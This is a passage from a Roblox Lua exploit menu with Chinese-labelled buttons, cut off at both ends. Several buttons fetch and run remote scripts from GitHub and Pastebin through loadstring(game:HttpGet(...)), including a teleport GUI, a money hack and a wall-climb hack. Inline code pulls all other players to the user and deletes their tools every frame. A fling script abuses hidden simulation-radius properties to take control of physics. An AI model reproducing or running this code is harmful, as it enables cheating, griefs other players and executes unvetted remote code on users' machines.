Part447.LeftSurface = Enum.SurfaceType.Weld
Part447.RightSurface = Enum.SurfaceType.Weld
Part447.TopSurface = Enum.SurfaceType.Weld
Part447.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part447.Position = Vector3.new(-13.9099846, 2.80021143, 30.7600117)
Part447.Orientation = Vector3.new(0, -90, -90)
Part447.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh448.Parent = Part447
CylinderMesh448.Offset = Vector3.new(0, -0.170000002, 0)
Part449.Parent = Model0
Part449.Material = Enum.Material.Metal
Part449.BrickColor = BrickColor.new("Grime")
Part449.Rotation = Vector3.new(90, -90, 0)
Part449.CanCollide = false
Part449.FormFactor = Enum.FormFactor.Custom
Part449.Size = Vector3.new(3.59999943, 0.200000003, 3.20000005)
Part449.CFrame = CFrame.new(-7.30978823, 2.80027866, 46.9599609, -6.56966131e-06, -1.93433134e-05, -1, -1, 9.822832e-06, 6.56947122e-06, 9.82270558e-06, 1, -1.93433771e-05)
Part449.BottomSurface = Enum.SurfaceType.Weld
Part449.FrontSurface = Enum.SurfaceType.Weld
Part449.LeftSurface = Enum.SurfaceType.Weld
Part449.RightSurface = Enum.SurfaceType.Weld
Part449.TopSurface = Enum.SurfaceType.Weld
Part449.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part449.Position = Vector3.new(-7.30978823, 2.80027866, 46.9599609)
Part449.Orientation = Vector3.new(0, -90, -90)
Part449.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh450.Parent = Part449
CylinderMesh450.Offset = Vector3.new(0, -0.170000002, 0)
Part451.Parent = Model0
Part451.Material = Enum.Material.Metal
Part451.BrickColor = BrickColor.new("Grime")
Part451.Rotation = Vector3.new(90, -90, 0)
Part451.CanCollide = false
Part451.FormFactor = Enum.FormFactor.Custom
Part451.Size = Vector3.new(3.59999943, 0.200000003, 3.20000005)
Part451.CFrame = CFrame.new(6.2901721, 2.80019784, 46.9599152, -6.44267539e-06, 5.35898835e-06, -1, -1, 7.80934624e-06, 6.45962518e-06, 7.56755799e-06, 1, 5.70298016e-06)
Part451.BottomSurface = Enum.SurfaceType.Weld
Part451.FrontSurface = Enum.SurfaceType.Weld
Part451.LeftSurface = Enum.SurfaceType.Weld
Part451.RightSurface = Enum.SurfaceType.Weld
Part451.TopSurface = Enum.SurfaceType.Weld
Part451.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part451.Position = Vector3.new(6.2901721, 2.80019784, 46.9599152)
Part451.Orientation = Vector3.new(0, -90, -90)
Part451.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh452.Parent = Part451
CylinderMesh452.Offset = Vector3.new(0, -0.170000002, 0)
for i,v in pairs(mas:GetChildren()) do
	v.Parent = workspace
	pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end


  	end    

})

Tab:AddButton({

	Name = "传送玩家",

	Callback = function()

     loadstring(game:HttpGet('https://raw.githubusercontent.com/Infinity2346/Tect-Menu/main/Teleport%20Gui.lua'))()

  	end    

})

Tab:AddButton({

	Name = "位置吸人",

	Callback = function()

     --[[
Subscribe to Zaptosis
--]]

local L_1_ = true;
local L_2_ = game.Players.LocalPlayer.Character.HumanoidRootPart;
local L_3_ = L_2_.Position - Vector3.new(5, 0, 0)

game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(L_4_arg1)
	if L_4_arg1 == 'f' then
		L_1_ = not L_1_
	end;
	if L_4_arg1 == 'r' then
		L_2_ = game.Players.LocalPlayer.Character.HumanoidRootPart;
		L_3_ = L_2_.Position - Vector3.new(5, 0, 0)
	end
end)

for L_5_forvar1, L_6_forvar2 in pairs(game.Players:GetPlayers()) do
	if L_6_forvar2 == game.Players.LocalPlayer then
	else
		local L_7_ = coroutine.create(function()
			game:GetService('RunService').RenderStepped:Connect(function()
				local L_8_, L_9_ = pcall(function()
					local L_10_ = L_6_forvar2.Character;
					if L_10_ then
						if L_10_:FindFirstChild("HumanoidRootPart") then
							if L_1_ then
								L_6_forvar2.Backpack:ClearAllChildren()
								for L_11_forvar1, L_12_forvar2 in pairs(L_10_:GetChildren()) do
									if L_12_forvar2:IsA("Tool") then
										L_12_forvar2:Destroy()
									end
								end;
								L_10_.HumanoidRootPart.CFrame = CFrame.new(L_3_)
							end
						end
					end
				end)
				if L_8_ then
				else
					warn("Unnormal error: "..L_9_)
				end
			end)
		end)
		coroutine.resume(L_7_)
	end
end;

game.Players.PlayerAdded:Connect(function(L_13_arg1)   
	if L_13_arg1 == game.Players.LocalPlayer then
	else
		local L_14_ = coroutine.create(function()
			game:GetService('RunService').RenderStepped:Connect(function()
				local L_15_, L_16_ = pcall(function()
					local L_17_ = L_13_arg1.Character;
					if L_17_ then
						if L_17_:FindFirstChild("HumanoidRootPart") then
							if L_1_ then
								L_13_arg1.Backpack:ClearAllChildren()
								for L_18_forvar1, L_19_forvar2 in pairs(L_17_:GetChildren()) do
									if L_19_forvar2:IsA("Tool") then
										L_19_forvar2:Destroy()
									end
								end;
								L_17_.HumanoidRootPart.CFrame = CFrame.new(L_3_)
							end
						end
					end
				end)
				if L_15_ then
				else
					warn("Unnormal error: "..L_16_)
				end
			end)
		end)
		coroutine.resume(L_14_)
	end           
end)

  	end    

})

Tab:AddButton({

	Name = "唐县刷钱",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/ok/tang%20county%20script"))()

  	end    

})

Tab:AddButton({

	Name = "2023颁奖典礼画质提升",

	Callback = function()

     local light = game.Lighting
for i, v in pairs(light:GetChildren()) do
	v:Destroy()
end

local ter = workspace.Terrain
local color = Instance.new("ColorCorrectionEffect")
local bloom = Instance.new("BloomEffect")
local sun = Instance.new("SunRaysEffect")
local blur = Instance.new("BlurEffect")

color.Parent = light
bloom.Parent = light
sun.Parent = light
blur.Parent = light

-- enable or disable shit

local config = {

	Terrain = true;
	ColorCorrection = true;
	Sun = true;
	Lighting = true;
	BloomEffect = true;
	
}

-- settings {

color.Enabled = false
color.Contrast = 0.15
color.Brightness = 0.1
color.Saturation = 0.25
color.TintColor = Color3.fromRGB(255, 222, 211)

bloom.Enabled = false
bloom.Intensity = 0.1

sun.Enabled = false
sun.Intensity = 0.2
sun.Spread = 1

bloom.Enabled = false
bloom.Intensity = 0.05
bloom.Size = 32
bloom.Threshold = 1

blur.Enabled = false
blur.Size = 6

-- settings }


if config.ColorCorrection then
	color.Enabled = true
end


if config.Sun then
	sun.Enabled = true
end


if config.Terrain then
	-- settings {
	ter.WaterWaveSize = 0.1
	ter.WaterWaveSpeed = 22
	ter.WaterTransparency = 0.9
	ter.WaterReflectance = 0.05
	-- settings }
end
if config.Lighting then
	-- settings {
	light.Ambient = Color3.fromRGB(0, 0, 0)
	light.Brightness = 4
	light.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
	light.ColorShift_Top = Color3.fromRGB(0, 0, 0)
	light.ExposureCompensation = 0
	light.FogColor = Color3.fromRGB(132, 132, 132)
	light.GlobalShadows = true
	light.OutdoorAmbient = Color3.fromRGB(112, 117, 128)
	light.Outlines = false
	-- settings }
end
local a = game.Lighting
a.Ambient = Color3.fromRGB(33, 33, 33)
a.Brightness = 5.69
a.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
a.ColorShift_Top = Color3.fromRGB(255, 247, 237)
a.EnvironmentDiffuseScale = 0.105
a.EnvironmentSpecularScale = 0.522
a.GlobalShadows = true
a.OutdoorAmbient = Color3.fromRGB(51, 54, 67)
a.ShadowSoftness = 0.18
a.GeographicLatitude = -15.525
a.ExposureCompensation = 0.75
b.Enabled = true
b.Intensity = 0.99
b.Size = 9999 
b.Threshold = 0
local c = Instance.new("ColorCorrectionEffect", a)
c.Brightness = 0.015
c.Contrast = 0.25
c.Enabled = true
c.Saturation = 0.2
c.TintColor = Color3.fromRGB(217, 145, 57)
if getgenv().mode == "Summer" then
   c.TintColor = Color3.fromRGB(255, 220, 148)
elseif getgenv().mode == "Autumn" then
   c.TintColor = Color3.fromRGB(217, 145, 57)
else
   warn("No mode selected!")
   print("Please select a mode")
   b:Destroy()
   c:Destroy()
end
local d = Instance.new("DepthOfFieldEffect", a)
d.Enabled = true
d.FarIntensity = 0.077
d.FocusDistance = 21.54
d.InFocusRadius = 20.77
d.NearIntensity = 0.277
local e = Instance.new("ColorCorrectionEffect", a)
e.Brightness = 0
e.Contrast = -0.07
e.Saturation = 0
e.Enabled = true
e.TintColor = Color3.fromRGB(255, 247, 239)
local e2 = Instance.new("ColorCorrectionEffect", a)
e2.Brightness = 0.2
e2.Contrast = 0.45
e2.Saturation = -0.1
e2.Enabled = true
e2.TintColor = Color3.fromRGB(255, 255, 255)
local s = Instance.new("SunRaysEffect", a)
s.Enabled = true
s.Intensity = 0.01
s.Spread = 0.146

print("Best Graphics loaded! Created by Roblox")

  	end    

})

Tab:AddButton({

	Name = "飞檐走壁",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()

  	end    

})

Tab:AddButton({

	Name = "人物失控",

	Callback = function()

     
--MADE BY Redmoon--
--Items:
clickfling = true -- set this to false if u dont want click fling or use torso fling

function rmesh(a)
if not (workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('Mesh') or workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('SpecialMesh')) then return end
old=game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character=workspace[game.Players.LocalPlayer.Name]
for i,v in next, workspace[game.Players.LocalPlayer.Name]:FindFirstChild(a).Handle:GetDescendants() do
if v:IsA('Mesh') or v:IsA('SpecialMesh') then
v:Remove()
end
end
for i = 1 , 2 do
game.Players.LocalPlayer.Character=old
end
end

a=game.Players.LocalPlayer b=game.Players.LocalPlayer.Character c={}d=table.insert e=false for D,E in next,game:GetService("Players").LocalPlayer.Character:GetDescendants()do if E:IsA("BasePart")then d(c,game:GetService("RunService").Heartbeat:connect(function()pcall(function()E.Velocity=Vector3.new(-30,0,0)sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge)sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",999999999)game.Players.LocalPlayer.ReplicationFocus=workspace end)end))end end function f(D,E,F)game.StarterGui:SetCore("SendNotification",{Title=D;Text=E;Duration=F or 5;})end local x=game:GetService("RunService")g=Instance.new('Folder',b)g.Name='CWExtra'b.Archivable=true local y=b:Clone()y.Name='NexoPD'for D,E in next,y:GetDescendants()do if E:IsA('BasePart')or E:IsA('Decal')then E.Transparency=1 end end h=5.65 a.Character=nil a.Character=b b.Humanoid.AutoRotate=false b.Humanoid.WalkSpeed=0 b.Humanoid.JumpPower=0 b.Torso.Anchored=true f('Nexo','Reanimating...\nPlease wait '..h..' seconds.')wait(h)b.Torso.Anchored=false f('Nexo','Reanimated..')b.Humanoid.Health=0 y.Animate.Disabled=true y.Parent=g y.HumanoidRootPart.CFrame=b.HumanoidRootPart.CFrame*CFrame.new(0,5,0)function i(D,E,F,G)Instance.new("Attachment",D)Instance.new("AlignPosition",D)Instance.new("AlignOrientation",D)Instance.new("Attachment",E)D.Attachment.Name=D.Name E.Attachment.Name=D.Name D.AlignPosition.Attachment0=D[D.Name]D.AlignOrientation.Attachment0=D[D.Name]D.AlignPosition.Attachment1=E[D.Name]D.AlignOrientation.Attachment1=E[D.Name]E[D.Name].Position=F or Vector3.new()D[D.Name].Orientation=G or Vector3.new()D.AlignPosition.MaxForce=999999999 D.AlignPosition.MaxVelocity=math.huge D.AlignPosition.ReactionForceEnabled=false D.AlignPosition.Responsiveness=math.huge D.AlignOrientation.Responsiveness=math.huge D.AlignPosition.RigidityEnabled=false D.AlignOrientation.MaxTorque=999999999 D.Massless=true end function j(D,E,F)Instance.new("Attachment",D)Instance.new("AlignPosition",D)Instance.new("Attachment",E)D.Attachment.Name=D.Name E.Attachment.Name=D.Name D.AlignPosition.Attachment0=D[D.Name]D.AlignPosition.Attachment1=E[D.Name]E[D.Name].Position=F or Vector3.new()D.AlignPosition.MaxForce=999999999 D.AlignPosition.MaxVelocity=math.huge D.AlignPosition.ReactionForceEnabled=false D.AlignPosition.Responsiveness=math.huge D.Massless=true end for D,E in next,b:GetDescendants()do if E:IsA('BasePart')then d(c,x.RenderStepped:Connect(function()E.CanCollide=false end))end end for D,E in next,b:GetDescendants()do if E:IsA('BasePart')then d(c,x.Stepped:Connect(function()E.CanCollide=false end))end end for D,E in next,y:GetDescendants()do if E:IsA('BasePart')then d(c,x.RenderStepped:Connect(function()E.CanCollide=false end))end end for D,E in next,y:GetDescendants()do if E:IsA('BasePart')then d(c,x.Stepped:Connect(function()E.CanCollide=false end))end end for D,E in next,b:GetDescendants()do if E:IsA('Accessory')then i(E.Handle,y[E.Name].Handle)end end i(b['Head'],y['Head'])i(b['Torso'],y['Torso'])j(b['HumanoidRootPart'],y['Torso'],Vector3.new(0,0,0))i(b['Right Arm'],y['Right Arm'])i(b['Left Arm'],y['Left Arm'])i(b['Right Leg'],y['Right Leg'])i(b['Left Leg'],y['Left Leg'])k=a:GetMouse()local z=Instance.new("Part",g)z.CanCollide=false z.Transparency=1 d(c,x.RenderStepped:Connect(function()local D=workspace.CurrentCamera.CFrame.lookVector local E=y["HumanoidRootPart"]z.Position=E.Position z.CFrame=CFrame.new(z.Position,Vector3.new(D.X*10000,D.Y,D.Z*10000))end))l=false m=false n=false o=false p=false function q(D)r=Instance.new('BodyAngularVelocity',D)r.AngularVelocity=Vector3.new(9e9,9e9,9e9)r.MaxTorque=Vector3.new(9e9,9e9,9e9)end q(b.HumanoidRootPart)k=a:GetMouse()s=Instance.new('BodyPosition',b.HumanoidRootPart)s.P=9e9 s.D=9e9 s.MaxForce=Vector3.new(99999,99999,99999)local A d(c,x.Heartbeat:Connect(function()if A==true then s.Position=k.Hit.p b.HumanoidRootPart.Position=k.Hit.p else s.Position=y.Torso.Position b.HumanoidRootPart.Position=y.Torso.Position end end))local B=Instance.new("SelectionBox")B.Adornee=b.HumanoidRootPart B.LineThickness=0.02 B.Color3=Color3.fromRGB(250,0,0)B.Parent=b.HumanoidRootPart B.Name="RAINBOW"t=B if clickfling then d(c,k.Button1Down:Connect(function()A=true end))d(c,k.Button1Up:Connect(function()A=false end))end d(c,k.KeyDown:Connect(function(D)if D==' 'then p=true end if D=='w'then l=true end if D=='s'then m=true end if D=='a'then n=true end if D=='d'then o=true end end))d(c,k.KeyUp:Connect(function(D)if D==' 'then p=false end if D=='w'then l=false end if D=='s'then m=false end if D=='a'then n=false end if D=='d'then o=false end end))local function C(D,E,F)z.CFrame=z.CFrame*CFrame.new(-D,E,-F)y.Humanoid.WalkToPoint=z.Position end d(c,x.RenderStepped:Connect(function()if l==true then C(0,0,1e4)end if m==true then C(0,0,-1e4)end if n==true then C(1e4,0,0)end if o==true then C(-1e4,0,0)end if p==true then y.Humanoid.Jump=true end if l~=true and n~=true and m~=true and o~=true then y.Humanoid.WalkToPoint=y.HumanoidRootPart.Position end end))workspace.CurrentCamera.CameraSubject=y.Humanoid u=Instance.new('BindableEvent')d(c,u.Event:Connect(function()y:Destroy()e=true v=false for D,E in next,b:GetDescendants()do if E:IsA('BasePart')then E.Anchored=true end end w=b.Humanoid:Clone()b.Humanoid:Destroy()w.Parent=b game.Players:Chat('-re')for D,E in pairs(c)do E:Disconnect()end game:GetService("StarterGui"):SetCore("ResetButtonCallback",true)u:Remove()end))game:GetService("StarterGui"):SetCore("ResetButtonCallback",u)

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

speed = 1
sine = 1
srv = game:GetService('RunService')

reanim = workspace.Camera.CameraSubject.Parent

function hat(h,p,c1,c0,m)
reanim[h].Handle.AccessoryWeld.Part1=reanim[p]
reanim[h].Handle.AccessoryWeld.C1=c1 or CFrame.new()
reanim[h].Handle.AccessoryWeld.C0=reanim[h].Handle.AccessoryWeld.C0:Lerp(c0 or CFrame.new(),1)
if m == true then
rmesh(h)
end
end

m=game.Players.LocalPlayer:GetMouse()
RJ = reanim.HumanoidRootPart.RootJoint
RS = reanim.Torso['Right Shoulder']
LS = reanim.Torso['Left Shoulder']
RH = reanim.Torso['Right Hip']
LH = reanim.Torso['Left Hip']
Root = reanim.HumanoidRootPart
NECK = reanim.Torso.Neck
NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C1 = CF(0,-1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))

Mode='1'

mousechanger=game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
if k == '1' then-- first mode
Mode='1'
elseif k == 'e' then-- second mode
Mode='2'
elseif k == 'q' then-- first mode again
Mode='1'
end
end)

attacklol=game.Players.LocalPlayer:GetMouse().Button1Down:Connect(function()
Mode='Attack1'
wait(1) -- time of attack u can edit this
Mode='Attack2'
wait(1)
Mode='Attack3'
wait(0.07)
Mode ='1' -- change this mode to whatever u want the mode to be after attacking
end)

coroutine.wrap(function()
while true do -- anim changer
if HumanDied then break end
sine = sine + speed
local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
if lookvector > reanim.Humanoid.WalkSpeed then
lookvector = reanim.Humanoid.WalkSpeed
end
if lookvector < -reanim.Humanoid.WalkSpeed then
lookvector = -reanim.Humanoid.WalkSpeed
end
if rightvector > reanim.Humanoid.WalkSpeed then
rightvector = reanim.Humanoid.WalkSpeed
end
if rightvector < -reanim.Humanoid.WalkSpeed then
rightvector = -reanim.Humanoid.WalkSpeed
end
local lookvel = lookvector / reanim.Humanoid.WalkSpeed
local rightvel = rightvector / reanim.Humanoid.WalkSpeed
if Mode == '1' then
if Root.Velocity.y > 1 then -- jump

elseif Root.Velocity.y < -1 then -- fall

elseif Root.Velocity.Magnitude < 2 then -- idle
hat('Nike Shoebox Costume','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('VANS_Umbrella','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('MeshPartAccessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),5.23+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Vector Arrow','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),4.15+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('TwitterBird','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),3.08+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Nebula Blade','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2.54+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('bloxcxy','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Slime1Accessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),1.47+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Robloxclassicred','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),0.39+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-47.91+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run

elseif Root.Velocity.Magnitude < 20 then -- walk
hat('Nike Shoebox Costume','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('VANS_Umbrella','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('MeshPartAccessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),5.23+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Vector Arrow','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),4.15+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('TwitterBird','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),3.08+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Nebula Blade','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2.54+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('bloxcxy','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Slime1Accessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),1.47+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Robloxclassicred','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),0.39+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-47.91+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+20*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+-20*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
end

elseif Mode == '2' then
if Root.Velocity.y > 1 then -- jump
elseif Root.Velocity.y < -1 then -- fall
elseif Root.Velocity.Magnitude < 2 then -- idle
hat('Nike Shoebox Costume','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
